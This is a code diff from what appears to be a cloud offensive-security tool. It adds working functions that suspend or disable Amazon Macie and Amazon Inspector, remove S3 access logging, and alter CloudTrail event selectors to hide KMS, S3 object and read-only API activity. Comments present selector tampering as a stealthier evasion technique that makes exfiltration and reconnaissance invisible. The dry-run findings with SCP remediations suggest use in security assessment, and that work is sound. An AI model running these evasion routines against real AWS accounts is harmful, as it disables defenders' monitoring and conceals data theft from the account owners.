-    ["macie2", "list-classification-jobs", "--query", "items[].[jobId,name,jobStatus,jobType]"],
-    profile,
-    region,
-    timeout,
-  )
+  const buckets = await aws(["macie2", "describe-buckets", "--query", "buckets | length(@)"], profile, region, timeout)
+  if (buckets.exitCode === 0) output.push(`  Monitored buckets: ${tryJson(buckets.stdout) || 0}`)
+
+  const jobs = await aws(["macie2", "list-classification-jobs", "--query", "items[].[jobId,name,jobStatus,jobType]"], profile, region, timeout)
   if (jobs.exitCode === 0) {
     const jl = tryJson(jobs.stdout) || []
-    output.push(`    Classification jobs: ${jl.length}`)
-    for (const j of jl) output.push(`      ${j[1]} (${j[0]})  Status: ${j[2]}  Type: ${j[3]}`)
+    output.push(`  Classification jobs: ${jl.length}`)
+    const running = (jl as string[][]).filter(j => j[2] === "RUNNING")
+    if (running.length > 0) output.push(`  [!] ${running.length} job(s) currently running`)
+    for (const j of (jl as string[][]).slice(0, 10)) output.push(`    ${j[1]} (${j[0]}) Status: ${j[2]} Type: ${j[3]}`)
   }
 
   if (action === "status") {
-    output.push("\n[*] Actions: --action suspend (pause), --action disable (permanently disable)")
+    const viable: string[] = []
+    if (allowed.has("macie2:UpdateMacieSession")) viable.push("suspend")
+    if (allowed.has("macie2:DisableMacie")) viable.push("disable")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action suspend|disable [--execute]`)
     return { output: output.join("\n"), findings }
   }
 
   if (action === "suspend") {
+    if (!allowed.has("macie2:UpdateMacieSession")) {
+      output.push(`\n[-] macie2:UpdateMacieSession DENIED — suspend blocked`)
+      findings.push({ checkId: "AWS-EVASION-MACIE-001", provider: "aws", severity: "info", status: "BLOCKED", resource: "macie:session", title: "Macie suspend blocked", details: "Cannot pause Macie session", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would suspend Macie session`)
+      output.push(`  Effect: S3 sensitive data scanning paused, existing findings retained`)
+      findings.push({ checkId: "AWS-EVASION-014", provider: "aws", severity: "critical", status: "READY", resource: "macie:session", title: "Macie suspend viable", details: "UpdateMacieSession allowed — sensitive data discovery can be paused", remediation: "Restrict macie2:UpdateMacieSession via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     const r = await aws(["macie2", "update-macie-session", "--status", "PAUSED"], profile, region, timeout)
     if (r.exitCode === 0) {
       output.push(`\n[+] Macie suspended — sensitive data discovery paused`)
-      findings.push({
-        checkId: "AWS-EVASION-014",
-        provider: "aws",
-        severity: "critical",
-        status: "SUSPENDED",
-        resource: "macie:session",
-        title: "Amazon Macie suspended",
-        details: "S3 sensitive data discovery paused — new sensitive data in S3 will not be detected",
-        remediation: "Resume: aws macie2 update-macie-session --status ENABLED",
-      })
+      findings.push({ checkId: "AWS-EVASION-014", provider: "aws", severity: "critical", status: "SUSPENDED", resource: "macie:session", title: "Amazon Macie suspended", details: "S3 sensitive data discovery paused — new data won't be detected. CloudTrail event: UpdateMacieSession", remediation: "Resume: aws macie2 update-macie-session --status ENABLED" })
     }
   }
 
   if (action === "disable") {
+    if (!allowed.has("macie2:DisableMacie")) {
+      output.push(`\n[-] macie2:DisableMacie DENIED — disable blocked`)
+      findings.push({ checkId: "AWS-EVASION-MACIE-002", provider: "aws", severity: "info", status: "BLOCKED", resource: "macie:session", title: "Macie disable blocked", details: "Cannot disable Macie", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would permanently disable Macie`)
+      output.push(`  Effect: all jobs stopped, findings deleted after 30 days, re-enable resets everything`)
+      findings.push({ checkId: "AWS-EVASION-018", provider: "aws", severity: "critical", status: "READY", resource: "macie:session", title: "Macie disable viable", details: "DisableMacie allowed — all sensitive data classification will stop permanently", remediation: "Restrict macie2:DisableMacie via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     const r = await aws(["macie2", "disable-macie"], profile, region, timeout)
     if (r.exitCode === 0) {
       output.push(`\n[+] Macie disabled permanently`)
-      findings.push({
-        checkId: "AWS-EVASION-018",
-        provider: "aws",
-        severity: "critical",
-        status: "DISABLED",
-        resource: "macie:session",
-        title: "Amazon Macie disabled",
-        details: "Macie permanently disabled — all classification jobs stopped, findings deleted after 30 days",
-        remediation: "Re-enable: aws macie2 enable-macie",
-      })
+      findings.push({ checkId: "AWS-EVASION-018", provider: "aws", severity: "critical", status: "DISABLED", resource: "macie:session", title: "Amazon Macie disabled", details: "Macie permanently disabled — all classification jobs stopped, findings deleted after 30d. CloudTrail event: DisableMacie", remediation: "Re-enable: aws macie2 enable-macie" })
     }
   }
 
@@ -1062,93 +1126,85 @@ export async function inspectorDisable(args: string[], timeout: number): Promise
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const action = argVal(args, "--action") || "status"
+  const execute = hasFlag(args, "--execute")
   const findings: Finding[] = []
-  const output: string[] = ["[*] Amazon Inspector — Vulnerability Scanning\n"]
+  const output: string[] = ["[*] Amazon Inspector — Vulnerability Scanning Evasion\n"]
 
-  const status = await aws(
-    [
-      "inspector2",
-      "batch-get-account-status",
-      "--query",
-      "accounts[0].{state:state,ec2:resourceState.ec2,ecr:resourceState.ecr,lambda:resourceState.lambda}",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["inspector2:BatchGetAccountStatus", "inspector2:Disable", "inspector2:ListCoverage"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: Disable`)
+  output.push(`[*] Detection: org delegated admin sees member status, Security Hub finding count drop`)
+
+  const status = await aws(["inspector2", "batch-get-account-status", "--query", "accounts[0].{state:state,ec2:resourceState.ec2,ecr:resourceState.ecr,lambda:resourceState.lambda}"], profile, region, timeout)
   if (status.exitCode !== 0) {
-    output.push("[-] Inspector v2 not enabled or access denied")
+    output.push("\n[-] Inspector v2 not enabled or access denied")
     return { output: output.join("\n"), findings }
   }
 
   const s = tryJson(status.stdout)
-  output.push(`[+] Inspector status: ${s?.state?.status || "unknown"}`)
-  if (s?.ec2) output.push(`    EC2 scanning: ${s.ec2.status}`)
-  if (s?.ecr) output.push(`    ECR scanning: ${s.ecr.status}`)
-  if (s?.lambda) output.push(`    Lambda scanning: ${s.lambda.status}`)
+  output.push(`\n[+] Inspector status: ${s?.state?.status || "unknown"}`)
+  const scanTypes: string[] = []
+  if (s?.ec2) { output.push(`  EC2 scanning: ${s.ec2.status}`); if (s.ec2.status === "ENABLED") scanTypes.push("EC2") }
+  if (s?.ecr) { output.push(`  ECR scanning: ${s.ecr.status}`); if (s.ecr.status === "ENABLED") scanTypes.push("ECR") }
+  if (s?.lambda) { output.push(`  Lambda scanning: ${s.lambda.status}`); if (s.lambda.status === "ENABLED") scanTypes.push("LAMBDA") }
 
-  const coverage = await aws(
-    ["inspector2", "list-coverage", "--query", "coveredResources | length(@)"],
-    profile,
-    region,
-    timeout,
-  )
-  if (coverage.exitCode === 0) {
-    output.push(`    Covered resources: ${tryJson(coverage.stdout) || 0}`)
-  }
+  const coverage = await aws(["inspector2", "list-coverage", "--query", "coveredResources | length(@)"], profile, region, timeout)
+  if (coverage.exitCode === 0) output.push(`  Covered resources: ${tryJson(coverage.stdout) || 0}`)
 
-  const findingsCount = await aws(
-    [
-      "inspector2",
-      "list-finding-aggregations",
-      "--aggregation-type",
-      "ACCOUNT",
-      "--query",
-      "responses[0].{critical:severityCounts.critical,high:severityCounts.high,medium:severityCounts.medium}",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  const findingsCount = await aws(["inspector2", "list-finding-aggregations", "--aggregation-type", "ACCOUNT", "--query", "responses[0].{critical:severityCounts.critical,high:severityCounts.high,medium:severityCounts.medium}"], profile, region, timeout)
   if (findingsCount.exitCode === 0) {
     const fc = tryJson(findingsCount.stdout)
-    if (fc) output.push(`    Findings: Critical=${fc.critical || 0} High=${fc.high || 0} Medium=${fc.medium || 0}`)
+    if (fc) output.push(`  Findings: Critical=${fc.critical || 0} High=${fc.high || 0} Medium=${fc.medium || 0}`)
+  }
+
+  const delegated = await aws(["inspector2", "list-delegated-admin-accounts", "--query", "delegatedAdminAccounts[].[accountId,status]"], profile, region, timeout)
+  if (delegated.exitCode === 0) {
+    const dl = tryJson(delegated.stdout) || []
+    if (dl.length > 0) {
+      output.push(`  [!] Delegated admin account(s): ${(dl as string[][]).map(d => d[0]).join(", ")} — they see member status changes`)
+    }
   }
 
   if (action === "status") {
-    output.push("\n[*] Actions: --action disable (disable all scanning)")
+    output.push(`\n[*] Currently scanning: ${scanTypes.length > 0 ? scanTypes.join(", ") : "NONE"}`)
+    output.push(`[*] Viable: ${allowed.has("inspector2:Disable") ? "disable" : "NONE — disable blocked"}`)
+    output.push(`[*] Use --action disable [--execute]`)
     return { output: output.join("\n"), findings }
   }
 
   if (action === "disable") {
+    if (!allowed.has("inspector2:Disable")) {
+      output.push(`\n[-] inspector2:Disable DENIED — disable blocked`)
+      findings.push({ checkId: "AWS-EVASION-INSP-001", provider: "aws", severity: "info", status: "BLOCKED", resource: "inspector:scanning", title: "Inspector disable blocked", details: "Cannot disable vulnerability scanning", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
     const types = ["EC2", "ECR", "LAMBDA", "LAMBDA_CODE"]
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would disable scanning for: ${types.join(", ")}`)
+      output.push(`  Effect: ${scanTypes.join(", ")} scanning stops, existing findings retained for 30d`)
+      findings.push({ checkId: "AWS-EVASION-015", provider: "aws", severity: "critical", status: "READY", resource: "inspector:scanning", title: "Inspector disable viable", details: `inspector2:Disable allowed — can stop vulnerability scanning for ${scanTypes.join(", ")}`, remediation: "Restrict inspector2:Disable via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     const r = await aws(["inspector2", "disable", "--resource-types", ...types], profile, region, timeout)
     if (r.exitCode === 0) {
       output.push(`\n[+] Inspector disabled for: ${types.join(", ")}`)
-      findings.push({
-        checkId: "AWS-EVASION-015",
-        provider: "aws",
-        severity: "critical",
-        status: "DISABLED",
-        resource: "inspector:scanning",
-        title: "Amazon Inspector vulnerability scanning disabled",
-        details: `Disabled scanning for ${types.join(", ")} — new vulnerabilities will not be detected`,
-        remediation: `Re-enable: aws inspector2 enable --resource-types ${types.join(" ")}`,
-      })
+      findings.push({ checkId: "AWS-EVASION-015", provider: "aws", severity: "critical", status: "DISABLED", resource: "inspector:scanning", title: "Amazon Inspector vulnerability scanning disabled", details: `Disabled scanning for ${types.join(", ")} — new vulnerabilities undetected. CloudTrail event: Disable`, remediation: `Re-enable: aws inspector2 enable --resource-types ${types.join(" ")}` })
     } else {
       const partial = await aws(["inspector2", "disable", "--resource-types", "EC2", "ECR"], profile, region, timeout)
       if (partial.exitCode === 0) {
-        output.push(`[+] Inspector partially disabled (EC2, ECR)`)
-        findings.push({
-          checkId: "AWS-EVASION-019",
-          provider: "aws",
-          severity: "critical",
-          status: "DISABLED",
-          resource: "inspector:scanning",
-          title: "Amazon Inspector scanning disabled (EC2, ECR)",
-          details: "EC2 and ECR vulnerability scanning disabled",
-          remediation: "Re-enable: aws inspector2 enable --resource-types EC2 ECR",
-        })
+        output.push(`[+] Inspector partially disabled (EC2, ECR) — LAMBDA types may not be available in this region`)
+        findings.push({ checkId: "AWS-EVASION-019", provider: "aws", severity: "critical", status: "DISABLED", resource: "inspector:scanning", title: "Amazon Inspector scanning disabled (EC2, ECR)", details: "EC2 and ECR vulnerability scanning disabled. CloudTrail event: Disable", remediation: "Re-enable: aws inspector2 enable --resource-types EC2 ECR" })
       }
     }
   }
@@ -1161,8 +1217,25 @@ export async function s3LoggingDisable(args: string[], timeout: number): Promise
   const region = argVal(args, "--region")
   const action = argVal(args, "--action") || "status"
   const bucket = argVal(args, "--bucket")
+  const execute = hasFlag(args, "--execute")
   const findings: Finding[] = []
   const output: string[] = ["[*] S3 Access Logging & Object-Level CloudTrail\n"]
+
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["s3:ListAllMyBuckets", "s3:GetBucketLogging", "s3:PutBucketLogging", "cloudtrail:PutEventSelectors"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: PutBucketLogging, PutEventSelectors`)
+  output.push(`[*] Detection: Config rule for S3 logging, CloudWatch metric on S3 request count`)
 
   const buckets = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
   if (buckets.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: s3:ListBuckets", findings }
@@ -1170,7 +1243,7 @@ export async function s3LoggingDisable(args: string[], timeout: number): Promise
   const bl = tryJson(buckets.stdout) || []
   const targets = bucket ? bl.filter((b: string) => b === bucket) : bl
 
-  output.push(`[+] Checking ${targets.length} buckets for access logging...\n`)
+  output.push(`\n[+] Checking ${targets.length} buckets for access logging...`)
 
   for (const b of targets) {
     const logging = await aws(["s3api", "get-bucket-logging", "--bucket", b], profile, region, timeout)
@@ -1251,33 +1324,32 @@ export async function s3LoggingDisable(args: string[], timeout: number): Promise
   }
 
   if (action === "status") {
-    output.push(
-      "\n[*] Actions: --action disable_access_log (remove S3 access logging), --action disable_data_events (remove S3 object-level CloudTrail)",
-    )
+    const viable: string[] = []
+    if (allowed.has("s3:PutBucketLogging")) viable.push("disable_access_log")
+    if (allowed.has("cloudtrail:PutEventSelectors")) viable.push("disable_data_events")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action disable_access_log|disable_data_events [--bucket <name>] [--execute]`)
     return { output: output.join("\n"), findings }
   }
 
   if (action === "disable_access_log") {
-    const targetBuckets = bucket ? [bucket] : targets.slice(0, 10)
+    if (!allowed.has("s3:PutBucketLogging")) {
+      output.push(`\n[-] s3:PutBucketLogging DENIED — access log disable blocked`)
+      findings.push({ checkId: "AWS-EVASION-S3-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "S3 access log disable blocked", details: "Cannot modify bucket logging", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const targetBuckets = bucket ? [bucket] : (targets as string[]).slice(0, 10)
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would disable access logging on ${targetBuckets.length} bucket(s):`)
+      for (const b of targetBuckets) output.push(`  ${b}`)
+      findings.push({ checkId: "AWS-EVASION-016", provider: "aws", severity: "critical", status: "READY", resource: `s3:logging:${targetBuckets.length}`, title: `S3 access log disable viable: ${targetBuckets.length} buckets`, details: "PutBucketLogging allowed — data access activity will become invisible", remediation: "Restrict s3:PutBucketLogging via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     for (const b of targetBuckets) {
-      const r = await aws(
-        ["s3api", "put-bucket-logging", "--bucket", b, "--bucket-logging-status", "{}"],
-        profile,
-        region,
-        timeout,
-      )
+      const r = await aws(["s3api", "put-bucket-logging", "--bucket", b, "--bucket-logging-status", "{}"], profile, region, timeout)
       if (r.exitCode === 0) {
         output.push(`[+] Access logging disabled: ${b}`)
-        findings.push({
-          checkId: "AWS-EVASION-016",
-          provider: "aws",
-          severity: "critical",
-          status: "DISABLED",
-          resource: `s3:logging:${b}`,
-          title: `S3 access logging disabled: ${b}`,
-          details: "Bucket access (GET/PUT/DELETE) no longer recorded — s3_dump/s3_exfil activity invisible",
-          remediation: `Re-enable: aws s3api put-bucket-logging --bucket ${b} --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"LOG_BUCKET"}}'`,
-        })
+        findings.push({ checkId: "AWS-EVASION-016", provider: "aws", severity: "critical", status: "DISABLED", resource: `s3:logging:${b}`, title: `S3 access logging disabled: ${b}`, details: "Bucket access no longer recorded — exfil invisible. CloudTrail event: PutBucketLogging", remediation: `Re-enable: aws s3api put-bucket-logging --bucket ${b} --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"LOG_BUCKET"}}'` })
       }
     }
   }
@@ -1334,26 +1406,37 @@ export async function s3LoggingDisable(args: string[], timeout: number): Promise
 
 export async function cloudtrailSelectorTamper(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action")
-  if (!action)
-    return {
-      output: "ERROR: --action required (status|exclude_kms|exclude_s3_data|management_read_only|restore)",
-      findings: [],
-    }
+  if (!action) return { output: "ERROR: --action required (status|exclude_kms|exclude_s3_data|management_read_only|restore)", findings: [] }
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const trailName = argVal(args, "--trail-name")
+  const execute = hasFlag(args, "--execute")
   const findings: Finding[] = []
-  const output: string[] = ["[*] CloudTrail Event Selector Manipulation (stealth)\n"]
+  const output: string[] = ["[*] CloudTrail Event Selector Manipulation (stealth evasion)\n"]
+
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["cloudtrail:DescribeTrails", "cloudtrail:GetEventSelectors", "cloudtrail:PutEventSelectors"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: PutEventSelectors (ironic — logged by the thing we're modifying)`)
+  output.push(`[*] Stealth: selector tampering does NOT trigger GuardDuty (unlike StopLogging)`)
+  output.push(`[*] This is the preferred technique over cloudtrail_blind stop — harder to detect`)
 
   const resolveTrail = async (): Promise<string | null> => {
     if (trailName) return trailName
     const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
     const name = tryJson(r.stdout)
-    if (!name || r.exitCode !== 0) {
-      output.push("[-] No CloudTrail trails found")
-      return null
-    }
-    return name
+    if (!name || r.exitCode !== 0) { output.push("[-] No CloudTrail trails found"); return null }
+    return name as string
   }
 
   if (action === "status") {
@@ -1363,21 +1446,38 @@ export async function cloudtrailSelectorTamper(args: string[], timeout: number):
       const sel = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t], profile, region, timeout)
       const data = tryJson(sel.stdout)
       if (!data) continue
-      output.push(`[+] Trail: ${t}`)
+      output.push(`\n[+] Trail: ${t}`)
       const selectors = data.EventSelectors || []
-      for (const s of selectors) {
-        output.push(`    ReadWriteType: ${s.ReadWriteType}`)
-        output.push(`    IncludeManagementEvents: ${s.IncludeManagementEvents}`)
-        const excludes = s.ExcludeManagementEventSources || []
-        output.push(`    ExcludeManagementEventSources: ${excludes.length > 0 ? excludes.join(", ") : "(none)"}`)
-        const dataRes = s.DataResources || []
-        output.push(
-          `    DataResources: ${dataRes.length > 0 ? dataRes.map((d: Record<string, string>) => d.Type).join(", ") : "(none)"}`,
-        )
+      for (const s of selectors as Record<string, unknown>[]) {
+        output.push(`  ReadWriteType: ${s.ReadWriteType}`)
+        output.push(`  IncludeManagementEvents: ${s.IncludeManagementEvents}`)
+        const excludes = (s.ExcludeManagementEventSources || []) as string[]
+        output.push(`  ExcludedSources: ${excludes.length > 0 ? excludes.join(", ") : "(none)"}`)
+        const dataRes = (s.DataResources || []) as Record<string, string>[]
+        output.push(`  DataResources: ${dataRes.length > 0 ? dataRes.map(d => d.Type).join(", ") : "(none)"}`)
+
+        const gaps: string[] = []
+        if (s.ReadWriteType !== "All") gaps.push(`ReadWriteType=${s.ReadWriteType} (not All)`)
+        if (s.IncludeManagementEvents === false) gaps.push("ManagementEvents=false")
+        if (excludes.length > 0) gaps.push(`Excluded: ${excludes.join(",")}`)
+        if (gaps.length > 0) output.push(`  [!] Existing blind spots: ${gaps.join("; ")}`)
       }
       const advanced = data.AdvancedEventSelectors || []
-      if (advanced.length > 0) output.push(`    AdvancedEventSelectors: ${advanced.length} rule(s)`)
+      if (advanced.length > 0) output.push(`  AdvancedEventSelectors: ${advanced.length} rule(s)`)
     }
+
+    const viable: string[] = []
+    if (allowed.has("cloudtrail:PutEventSelectors")) {
+      viable.push("exclude_kms", "exclude_s3_data", "management_read_only", "restore")
+    }
+    output.push(`\n[*] Viable: ${viable.length > 0 ? viable.join(", ") : "NONE — PutEventSelectors blocked"}`)
+    output.push(`[*] Use --action exclude_kms|exclude_s3_data|management_read_only|restore [--trail-name <name>] [--execute]`)
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!allowed.has("cloudtrail:PutEventSelectors")) {
+    output.push(`\n[-] cloudtrail:PutEventSelectors DENIED — all selector manipulation blocked`)
+    findings.push({ checkId: "AWS-EVASION-SEL-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail selector tampering blocked", details: "Cannot modify event selectors", remediation: "N/A" })
     return { output: output.join("\n"), findings }
   }
 
@@ -1389,86 +1489,52 @@ export async function cloudtrailSelectorTamper(args: string[], timeout: number):
   const selectors = currentData?.EventSelectors || [{ ReadWriteType: "All", IncludeManagementEvents: true }]
 
   if (action === "exclude_kms") {
-    const updated = selectors.map((s: Record<string, unknown>) => ({
-      ...s,
-      ExcludeManagementEventSources: ["kms.amazonaws.com"],
-    }))
-    const r = await aws(
-      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
-      profile,
-      region,
-      timeout,
-    )
-    output.push(
-      r.exitCode === 0
-        ? `[+] KMS operations excluded from ${trail} — KMS API calls no longer logged`
-        : `[-] Failed: ${r.stderr.slice(0, 200)}`,
-    )
+    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, ExcludeManagementEventSources: ["kms.amazonaws.com"] }))
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would exclude KMS events from: ${trail}`)
+      output.push(`  Effect: Decrypt, Encrypt, GenerateDataKey calls invisible — reduces noise AND hides crypto operations`)
+      findings.push({ checkId: "AWS-EVASION-SEL-KMS", provider: "aws", severity: "high", status: "READY", resource: trail, title: `KMS exclusion viable on: ${trail}`, details: "PutEventSelectors allowed — KMS API calls can be hidden from CloudTrail", remediation: "Monitor PutEventSelectors calls, enforce full logging via SCP" })
+      return { output: output.join("\n"), findings }
+    }
+    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
+    output.push(r.exitCode === 0 ? `[+] KMS operations excluded from ${trail} — KMS API calls no longer logged` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SEL-KMS", provider: "aws", severity: "high", status: "TAMPERED", resource: trail, title: `KMS events excluded from: ${trail}`, details: "KMS Decrypt/Encrypt/GenerateDataKey invisible. CloudTrail event: PutEventSelectors", remediation: "Remove ExcludeManagementEventSources from event selectors" })
   }
 
   if (action === "exclude_s3_data") {
-    const updated = selectors.map((s: Record<string, unknown>) => ({
-      ...s,
-      DataResources: [],
-    }))
-    const r = await aws(
-      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
-      profile,
-      region,
-      timeout,
-    )
-    output.push(
-      r.exitCode === 0
-        ? `[+] S3 data events removed from ${trail} — s3:GetObject/PutObject no longer logged`
-        : `[-] Failed: ${r.stderr.slice(0, 200)}`,
-    )
+    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, DataResources: [] }))
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would remove S3 data events from: ${trail}`)
+      output.push(`  Effect: s3:GetObject/PutObject no longer logged — data exfil invisible`)
+      findings.push({ checkId: "AWS-EVASION-SEL-S3", provider: "aws", severity: "critical", status: "READY", resource: trail, title: `S3 data event removal viable on: ${trail}`, details: "Can remove S3 object-level logging — data exfiltration becomes invisible", remediation: "Monitor PutEventSelectors, enforce S3 data events via SCP" })
+      return { output: output.join("\n"), findings }
+    }
+    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
+    output.push(r.exitCode === 0 ? `[+] S3 data events removed from ${trail} — s3:GetObject/PutObject no longer logged` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SEL-S3", provider: "aws", severity: "critical", status: "TAMPERED", resource: trail, title: `S3 data events removed from: ${trail}`, details: "s3:GetObject/PutObject invisible — exfil undetectable. CloudTrail event: PutEventSelectors", remediation: "Re-add S3 data event selectors" })
   }
 
   if (action === "management_read_only") {
-    const updated = selectors.map((s: Record<string, unknown>) => ({
-      ...s,
-      ReadWriteType: "WriteOnly",
-    }))
-    const r = await aws(
-      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)],
-      profile,
-      region,
-      timeout,
-    )
-    output.push(
-      r.exitCode === 0
-        ? `[+] Management events set to WriteOnly on ${trail} — List*/Get*/Describe* calls invisible`
-        : `[-] Failed: ${r.stderr.slice(0, 200)}`,
-    )
-    if (r.exitCode === 0) {
-      findings.push({
-        checkId: "AWS-EVASION-SELECTOR-001",
-        provider: "aws",
-        severity: "high",
-        status: "TAMPERED",
-        resource: trail,
-        title: "CloudTrail event selectors modified to WriteOnly",
-        details: "Read-only API calls (List, Get, Describe) are no longer logged — recon is invisible",
-        remediation: "Restore ReadWriteType to All",
-      })
+    const updated = (selectors as Record<string, unknown>[]).map(s => ({ ...s, ReadWriteType: "WriteOnly" }))
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would set WriteOnly on: ${trail}`)
+      output.push(`  Effect: List*/Get*/Describe* calls invisible — all recon becomes undetectable`)
+      findings.push({ checkId: "AWS-EVASION-SELECTOR-001", provider: "aws", severity: "high", status: "READY", resource: trail, title: `Management event filtering viable on: ${trail}`, details: "Can hide all read API calls — recon is invisible while write events still logged (lower suspicion)", remediation: "Restore ReadWriteType to All, enforce via SCP" })
+      return { output: output.join("\n"), findings }
     }
+    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(updated)], profile, region, timeout)
+    output.push(r.exitCode === 0 ? `[+] Management events set to WriteOnly on ${trail} — List*/Get*/Describe* invisible` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
+    if (r.exitCode === 0) findings.push({ checkId: "AWS-EVASION-SELECTOR-001", provider: "aws", severity: "high", status: "TAMPERED", resource: trail, title: "CloudTrail selectors modified to WriteOnly", details: "Read-only API calls invisible — recon undetectable. CloudTrail event: PutEventSelectors", remediation: "Restore ReadWriteType to All" })
   }
 
   if (action === "restore") {
-    const restored = [
-      { ReadWriteType: "All", IncludeManagementEvents: true, DataResources: [], ExcludeManagementEventSources: [] },
-    ]
-    const r = await aws(
-      ["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(restored)],
-      profile,
-      region,
-      timeout,
-    )
-    output.push(
-      r.exitCode === 0
-        ? `[+] Event selectors restored to full logging on ${trail}`
-        : `[-] Failed: ${r.stderr.slice(0, 200)}`,
-    )
+    const restored = [{ ReadWriteType: "All", IncludeManagementEvents: true, DataResources: [], ExcludeManagementEventSources: [] }]
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would restore full logging on: ${trail}`)
+      return { output: output.join("\n"), findings }
+    }
+    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(restored)], profile, region, timeout)
+    output.push(r.exitCode === 0 ? `[+] Event selectors restored to full logging on ${trail}` : `[-] Failed: ${r.stderr.slice(0, 200)}`)
   }
 
   return { output: output.join("\n"), findings }
